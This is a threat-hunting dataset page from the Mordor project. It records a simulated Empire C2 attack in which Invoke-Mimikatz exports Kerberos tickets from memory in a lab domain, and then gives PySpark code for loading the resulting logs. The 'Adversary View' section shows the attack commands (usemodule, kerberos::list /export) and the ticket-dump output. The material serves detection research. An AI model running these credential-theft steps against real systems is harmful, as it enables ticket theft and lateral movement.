# Empire Mimikatz Extract Tickets

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518230752 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_extract_tickets.tar.gz |

## Dataset Description
This dataset represents adversaries using PowerSploit's Invoke-Mimikatz function to extract kerberos tickets from memory in base64-encoded form.

## Adversary View
```
(Empire: TKV35P8X) > usemodule credentials/mimikatz/extract_tickets
(Empire: powershell/credentials/mimikatz/extract_tickets) > info

              Name: Invoke-Mimikatz extract kerberos tickets.
            Module: powershell/credentials/mimikatz/extract_tickets
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract
  kerberos tickets from memory in base64-encoded form.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        TKV35P8X                  Agent to run module on.                 

(Empire: powershell/credentials/mimikatz/extract_tickets) > execute
[*] Tasked TKV35P8X to run TASK_CMD_JOB
[*] Agent TKV35P8X tasked with task ID 39
[*] Tasked agent TKV35P8X to run module powershell/credentials/mimikatz/extract_tickets
(Empire: powershell/credentials/mimikatz/extract_tickets) > Job started: YG28AV
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # standard::base64
isBase64InterceptInput  is false
isBase64InterceptOutput is false

mimikatz(powershell) # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 7:03:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : krbtgt/SHIRE.COM @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
  * Saved to file     : 0-60a10000-nmartha@krbtgt~SHIRE.COM-SHIRE.COM.kirbi

[00000001] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:23:33 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : krbtgt/SHIRE.COM @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
  * Saved to file     : 1-40e10000-nmartha@krbtgt~SHIRE.COM-SHIRE.COM.kirbi

[00000002] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 7:03:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : cifs/HFDC01.shire.com @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 2-40a50000-nmartha@cifs~HFDC01.shire.com-SHIRE.COM.kirbi

[00000003] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:54:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : ldap/HFDC01.shire.com/shire.com @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 3-40a50000-nmartha@ldap~HFDC01.shire.com~shire.com-SHIRE.COM.kirbi

[00000004] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:32:04 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : HOST/HFDC01 @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 4-40a50000-nmartha@HOST~HFDC01-SHIRE.COM.kirbi

[00000005] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:23:48 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : cifs/IT001 @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 5-40a10000-nmartha@cifs~IT001-SHIRE.COM.kirbi

[00000006] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:23:33 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : ldap/HFDC01.shire.com @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 6-40a50000-nmartha@ldap~HFDC01.shire.com-SHIRE.COM.kirbi

(Empire: powershell/credentials/mimikatz/extract_tickets) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_extract_tickets.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        